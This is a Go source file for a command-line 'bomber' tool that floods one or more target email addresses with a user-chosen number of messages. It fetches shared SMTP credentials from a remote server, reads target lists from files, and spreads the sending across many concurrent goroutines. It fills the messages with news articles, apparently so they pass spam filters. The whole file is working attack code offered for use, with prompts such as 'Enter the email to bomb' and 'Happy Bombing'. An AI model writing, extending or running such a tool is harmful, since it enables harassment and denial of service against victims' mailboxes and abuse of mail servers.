package bomber

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"go_cli/fileutil"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/fatih/color"
	"github.com/ncruces/zenity"
	"gopkg.in/gomail.v2"
)

type SmtpOpts struct {
	Host     string `json:"host"`
	Port     string `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	Default  bool
}

type SmtpConnOpts struct {
	Conn      gomail.SendCloser
	NumErrors int
	NewConn   bool
}

func Bomber() {
	reader := bufio.NewReader(os.Stdin)
	blue := color.New(color.FgHiBlue).PrintFunc()
	red := color.New(color.FgRed).PrintfFunc()
	red("\nNOTE: Should the default newsapi.org api key fail, kindly register a new account.\nGet a new api key from the dashboard and restart the tool using that.\n\n")
	blue("Continue with a default newsapi.org api key? Y/n :> ")
	ChooseKey, err := reader.ReadString('\n')
	if err != nil {
		red("err: %v\n", err)
		return
	} else if ChooseKey == "\n" {
		red("Invalid choice. Exiting Program...\n")
		return
	}
	trimmedChooseKey := strings.ToLower(strings.TrimSpace(ChooseKey))
	var apiKey string
	if !strings.Contains(trimmedChooseKey, "y") {
		blue("\nEnter your api key :> ")
		rawKey, err := reader.ReadString('\n')
		if err != nil {
			red("err: %v\n", err)
			return
		} else if rawKey == "\n" {
			red("Empty key not accepted. Exiting Program...\n")
			return
		}
		apiKey = strings.TrimSpace(rawKey)
	}

	var smtpCreds SmtpOpts
	blue("\nwant to use a default SMTP provided by the tool? Y/n :> ")
	rawSmtpChoice, err := reader.ReadString('\n')
	if err != nil {
		red("err: %v\n", err)
		return
	} else if rawSmtpChoice == "\n" {
		red("Invalid choice. Exiting Program...\n")
		return
	}

	trimmedSmtpChoice := strings.ToLower(strings.TrimSpace(rawSmtpChoice))

	if strings.Contains(trimmedSmtpChoice, "y") {
		blue("\nFetching SMTP credentials...\n")
		res, err := http.Get("https://netblast-suite.azurewebsites.net/smtp")
		if err != nil {
			red("err: %v\n", err)
			return
		}
		body, err := io.ReadAll(res.Body)
		if err != nil {
			red("err: %v\n", err)
			return
		}
		defer res.Body.Close()
		if res.StatusCode == 429 {
			red("err: You are abusing the default SMTP api. Kindly restart the tool with yours.\n")
			return
		} else if res.StatusCode == 200 {
			json.Unmarshal(body, &smtpCreds)
			smtpCreds.Default = true
			color.New(color.FgGreen).Printf("\nDefault SMTP fetched successfully.\n")
		}

	} else {
		var filteredCreds []string
		blue("\nEnter your SMTP Credentials. Format >  HOST,PORT,USERNAME,PASSWORD\n")
		blue(">>> ")
		rawSmtpCreds, err := reader.ReadString('\n')
		if err != nil {
			red("err: %v\n", err)
			return
		} else if rawSmtpCreds == "\n" {
			red("Invalid input. Exiting Program...\n")
			return
		}
		splitedCreds := strings.Split(rawSmtpCreds, ",")
		for _, creds := range splitedCreds {
			trimmedCreds := strings.TrimSpace(creds)
			if len(trimmedCreds) != 0 {
				filteredCreds = append(filteredCreds, trimmedCreds)
			}
		}
		smtpCreds.Host = filteredCreds[0]
		smtpCreds.Port = filteredCreds[1]
		smtpCreds.Username = filteredCreds[2]
		smtpCreds.Password = filteredCreds[3]
		smtpCreds.Default = false
	}

	blue("\nverifying SMTP Credentials...\n")
	port, _ := strconv.Atoi(smtpCreds.Port)
	dialer := gomail.NewDialer(smtpCreds.Host, port, smtpCreds.Username, smtpCreds.Password)
	dialer.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	conn, err := dialer.Dial()
	if err != nil {
		if smtpCreds.Default {
			red("err: %v\n", err)
			red("The default SMTP is dead. Restart the tool with yours.\n")
		} else {
			red("err: %v\n", err)
		}
		return
	}
	smtpConn := SmtpConnOpts{Conn: conn, NewConn: true}
	defer smtpConn.Conn.Close()
	color.New(color.FgGreen).Printf("\nSMTP connection has been established.\n")

	blue("\nis your target more than 1? Y/n :> ")
	rawNumTarget, err := reader.ReadString('\n')
	if err != nil {
		red("err: %v\n", err)
		return
	} else if rawNumTarget == "\n" {
		red("invalid choice. Exiting Program...\n")
		return
	}
	numTarget := strings.ToLower(strings.TrimSpace(rawNumTarget))
	var targetEmail string
	var targetList []string
	if strings.Contains(numTarget, "y") {

		blue("\nPress Enter to select your target list: ")
		_, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("err: %v\n", err)
			return
		}
		filePath, err := zenity.SelectFile(
			zenity.FileFilters{
				{Patterns: []string{"*.txt"}, CaseFold: false},
			})
		if err != nil {
			red("err: %v\n", err)
			return
		}
		targetList, err = fileutil.ReadFromFile(filePath)
		if err != nil {
			red("err: %v\n", err)
			return
		}
		color.New(color.FgHiMagenta).Printf("\nTotal Target Emails: %d\n", len(targetList))
	} else {
		blue("\nEnter the email to bomb :> ")
		fmt.Scanln(&targetEmail)
		if len(targetEmail) == 0 {
			red("invalid input. Exiting Program...\n")
			return
		}
	}
	blue("\nEnter number of emails to send :> ")
	numEmails, err := reader.ReadString('\n')
	if err != nil {
		red("err: %v\n", err)
		return
	} else if numEmails == "\n" {
		red("invalid input. Exiting Program...\n")
		return
	}
	numEmails = strings.TrimSpace(numEmails)
	numBombs, _ := strconv.Atoi(numEmails)

	var wg sync.WaitGroup
	var mutex sync.Mutex
	msgOpts := gomail.NewMessage()

	pgBar := MakePgBar(numBombs, "Bombing... ->")

	blue("\nfetching news data...\n")
	body, err := GetMsgContent(apiKey)
	if err != nil {
		red("err: %v\n", err)
		return
	}
	var numValidArticles []int
	if body.TotalResults > 0 {
		color.New(color.FgGreen).Printf("\nFetch was successful. Happy Bombing :)\n")
		for _, article := range body.Articles {
			if article.Content != "" {
				numValidArticles = append(numValidArticles, 1)
			}
		}
	} else {
		red("The api has reached it's limit.\nKindly visit newsapi.org to register a new account.\nGet the api key from the dashboard and restart the tool with the given api key.\n")
		return
	}
	if len(targetList) == 0 {
		maxWorkers := len(numValidArticles)
		msgOpts.SetHeader("To", targetEmail)
		chunkSize := numBombs / maxWorkers

		if numBombs%maxWorkers != 0 {
			chunkSize++
		}

		workingChan := make(chan []int, chunkSize)
		articleChunks := make(chan Article, 1)
		distSlice := make([]int, numBombs)
		for i := 0; i < numBombs; i++ {
			distSlice[i] = i
		}
		if smtpCreds.Host == "smtp.gmail.com" {
			for i := 0; i < maxWorkers; i++ {
				wg.Add(1)
				go HandleGmailSMTP(articleChunks, workingChan, &wg, &mutex, msgOpts, smtpCreds, pgBar, &smtpConn)
			}
		} else {
			for i := 0; i < maxWorkers; i++ {
				wg.Add(1)
				go SingleBomb(articleChunks, workingChan, &wg, &mutex, msgOpts, smtpCreds, pgBar, &smtpConn)
			}
		}

		articles := body.Articles
		for _, article := range articles {
			if article.Content != "" {
				articleChunks <- article
			}

		}
		close(articleChunks)

		for i := 0; i < numBombs; i += chunkSize {
			end := i + chunkSize
			if end > numBombs {
				end = numBombs
			}
			workingChan <- distSlice[i:end]
		}
		close(workingChan)

		wg.Wait()
		color.New(color.FgMagenta).Println("\n\nall done. Thanks for using the tool.")
	} else {
		maxWorkers := 1000
		chunkSize := len(targetList) / maxWorkers

		if len(targetList)%maxWorkers != 0 {
			chunkSize++
		}

		emailChunks := make(chan []string, chunkSize)
		articleChunks := make(chan Article, 1)

		for i := 0; i < maxWorkers; i++ {
			wg.Add(1)
			go MultiTargetBomb(articleChunks, emailChunks, &wg, &mutex, msgOpts, smtpCreds, numBombs, &smtpConn)
		}

		for i := 0; i < len(targetList); i += chunkSize {
			end := i + chunkSize
			if end > len(targetList) {
				end = len(targetList)
			}
			emailChunks <- targetList[i:end]
		}
		close(emailChunks)

		articles := body.Articles
		go func() {
			process := true
			for process {
				select {
				case _, ok := <-articleChunks:
					if !ok {
						process = false
					}
				default:
					for _, article := range articles {
						if article.Content != "" {
							articleChunks <- article
						}
					}
				}
			}
		}()

		wg.Wait()
		close(articleChunks)
		color.New(color.FgMagenta).Println("\n\nall done. Thanks for using the tool.")
		os.Exit(0)
	}

}
